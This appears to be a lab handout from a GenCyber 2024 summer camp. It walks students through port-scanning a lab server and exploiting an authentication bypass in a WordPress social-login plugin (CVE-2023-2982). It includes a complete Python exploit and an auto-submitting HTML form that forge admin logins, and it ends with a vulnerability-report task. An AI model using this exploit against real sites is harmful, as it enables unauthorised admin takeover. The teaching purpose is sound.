<h1>Welcome to GenCyber Summer Camp 2024!</h1>

Together we are going to learn how to exploit a website that has a public vulnerability.  Lets see what else we can figure out about this website.  We also know that the website owner emailed us from admin@example.com which might come in handy later.

<h3>The pictures were taking using Chromium, if you're using Firefox you may need to do some deeper diving</h3>

Lets take a look at: [Download the Free Nmap Security Scanner for Linux/Mac/Windows](https://nmap.org/download.html)

To install on your Raspberry Pis, just use `sudo apt install nmap`
<!-- Go ahead and follow the instructions to download nmap onto your device from the website.  -->

Once you have it installed you should be able to run it in your terminal with `nmap <command>`

We were given an IP address that this machine is running on: `144.80.64.114` so using that information read this article: [Port Scanning Basics | Nmap Network Scanning](https://nmap.org/book/man-port-scanning-basics.html) and see what information you can gather about this site.
<br> Don't move onto the next section until you have completed a port scan of the website and make sure to take a screenshot of the scan for your report.

<details>
    <summary>
        After scanning you should have discovered these ports are running:
    </summary>
    443, 80
</details>

In your browser go to: [http://144.80.64.114/](http://144.80.64.114/), which is the website running on port 80 and have a look around.  After you had some time to explore you should right click and inspect the website:
![[Pasted image 20240626205001.png]](https://raw.githubusercontent.com/alphapuggle/GenCyber2024/main/Pasted%20image%2020240626205001.png)

And then take a look at the applications tab and examine the cookies for the site:
![[Pasted image 20240626210027.png]](https://raw.githubusercontent.com/alphapuggle/GenCyber2024/main/Pasted%20image%2020240626210027.png)

Notice how that table is empty, showing us that we are not logged in.  Now take a look at the network tab and take note of this service that we have running on the site:
![[Pasted image 20240626213842.png]](https://raw.githubusercontent.com/alphapuggle/GenCyber2024/main/Pasted%20image%2020240626213842.png)

This login method is out of date and has known vulnerabilities associated with it which you can read about here: [CVE-2023-2982 : The WordPress Social Login and Register (Discord, Google, Twitter, LinkedIn) plugin for WordPress is vulnerable to authe (cvedetails.com)](https://www.cvedetails.com/cve/CVE-2023-2982/)

> Make sure to take note of this in your report as well as a screenshot of the running service.


Now that we have a possible login method lets look and see if there are any proof's of concept attacks (POCs) for the attack or public scripts that exploit this attack.  I encourage you to do your own research about this vulnerability but for the purpose of this lab I have found us a POC that we can use: [GitHub - RandomRobbieBF/CVE-2023-2982: WordPress Social Login and Register (Discord, Google, Twitter, LinkedIn) <= 7.6.4 - Authentication Bypass](https://github.com/RandomRobbieBF/CVE-2023-2982/tree/main) 

Typically you would have to download and modify this file yourself. To prevent errors or anything actually malicious, I have uploaded the code you will need here:

create a file called `exploit.py` and put this code in it:

<h3>exploit.py</h3>

```python
import requests
import os
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
import base64
import argparse
import random
import string

# Disable insecure request warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Set up session with a custom User-Agent
session = requests.Session()
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
session.headers.update({'User-Agent': user_agent})

passphrase = 'jMj7MEdu4wkHObiD'

def try_login(website_url, email):
    website_url = website_url.rstrip('\/') + '/'
    
    # Encrypt and encode email
    cipher = AES.new(passphrase.encode('utf-8'), AES.MODE_ECB)
    padded_email = pad(email.encode('utf-8'), AES.block_size)
    encrypted_email = cipher.encrypt(padded_email)
    encoded_email = base64.b64encode(encrypted_email).decode('utf-8')
    
    try:
        response = session.post(website_url, headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                data={'option': 'moopenid', 'email': encoded_email, 'appName': 'rlHeqZw2vrPzOiWWfCParA=='},
                                allow_redirects=False, verify=False, timeout=10)
        
        if any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
            print("Login Worked!")
            random_string = ''.join(random.choices(string.digits, k=4))
            with open("login.html", 'r') as file:
                file_content = file.read()
                replaced_content = file_content.replace('WEBSITE_REPLACE', website_url).replace('EMAIL_REPLACE', encoded_email)
            
            with open(f"login-{random_string}.html", 'w') as file:
                file.write(replaced_content)
            print(f"To login again, open login-{random_string}.html")
        else:
            print(f"Login Failed with {email}")
    except requests.exceptions.RequestException as e:
        print('Error occurred while logging in:', str(e))

def scan_and_extract(website_url):
    print(f"Crawling {website_url} for email addresses.")
    os.system(f"katana -kf all -u {website_url} -o /tmp/katana.txt")
    print("Using Nuclei to extract emails from links")
    os.system("nuclei -l /tmp/katana.txt -t email-extraction.yaml -nc -nm -fr -o /tmp/nuc.txt")
    
    with open("/tmp/nuc.txt", "r") as f:
        lines = f.readlines()
        emails = set()
        for line in lines:
            matches = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', line)
            emails.update(matches)
    
    with open("/tmp/nuc.txt", "w") as f:
        for email in emails:
            f.write(email + "\n")
    
    for email in emails:
        try_login(website_url, email)

def main():
    parser = argparse.ArgumentParser(description='CVE-2023-2982 Exploit')
    parser.add_argument('-w', '--website_url', required=True, help='Website URL')
    parser.add_argument('-e', '--email', required=False, help='Email')
    args = parser.parse_args()
    
    website_url = args.website_url
    email = args.email
    
    if email:
        try_login(website_url, email)
    else:
        scan_and_extract(website_url)

if __name__ == "__main__":
    main()

```

Create another file called `login.html` and put this code inside of it:

<h3>login.html</h3>

```html
<html>
<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.js" integrity="sha512-eKwZNCvuOhxcqGTXAudC9WH2KUKf8Id1cqNoMc6DKZuN8upL22xj3ZkJdckyDd3Gjsi1QHKZ3ug0XQHQkGRNJg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script type="text/javascript">
        $(document).ready(function () {
            window.document.forms[0].submit();
        });
    </script>
</head>
<body>

<p style="font: calibri;">Please wait...</p>
<form action="WEBSITE_REPLACE/?option=moopenid" method="post" id="oauth-form">
    <input type="hidden" name="access_token" value="null"/>
    <input type="hidden" name="token_type" value="null"/>

    <input type="hidden" name="profileUrl" value="null"/>

    <input type="hidden" name="firstName" value="null"/>

    <input type="hidden" name="lastName" value="null"/>

    <input type="hidden" name="appName" value="5mOYjGe8QSZBuYFqNSAS4A=="/>

    <input type="hidden" name="profilePic" value="null"/>

    <input type="hidden" name="userid" value="null"/>

    <input type="hidden" name="email" value="EMAIL_REPLACE"/>

    <input type="hidden" name="username" value="null"/>

</form>
</body>
</html>

```

To use the `explot.py` file, we need to install these dependencies using pip:
```
requests 
pycryptodome
```

Make sure both files are in the same directory, and `cd` to it. Once you're in the directory you can run the following command: `python3 exploit.py -w http://144.80.64.114/ -e admin@example.com` 

> Notice how we stole the website owners email from the initial email he sent us.

You should get terminal output that looks like this:
```
>> python3 exploit.py -w http://144.80.64.114/ -e admin@example.com
Login Worked!
To login again, open login-4358.html
```

Now there should be a new .html file in the same directory as your script.  Open it up and it should take you to the website (if for some reason it takes you to localhost/127.0.0.1 just keep reopening the new html file until you return to the blog site) 

Once you are on the new site you should now see a menu open on the left which should greet you as admin meaning you have successfully logged in as an admin user on the site.  To further verify this you can go back into the cookies tab and confirm you are logged in as admin:
![[Pasted image 20240626205943.png]](https://raw.githubusercontent.com/alphapuggle/GenCyber2024/main/Pasted%20image%2020240626205943.png)

> Make sure to take a screenshot of this for your report.

Now that you have completed your attack take some time to do some research and write a mini report that you could give to your friend or client outlining this vulnerability.<br>
Your report should outline what vulnerability was found, what it impacts, and how to mitigate it.

Make sure to pull information from some resources we have already seen as well, I'll list these two to start:<br>
[CVE-2023-2982 : The WordPress Social Login and Register (Discord, Google, Twitter, LinkedIn) plugin for WordPress is vulnerable to authe (cvedetails.com)](https://www.cvedetails.com/cve/CVE-2023-2982/)<br>
[OWASP Top Ten | OWASP Foundation](https://owasp.org/www-project-top-ten/)
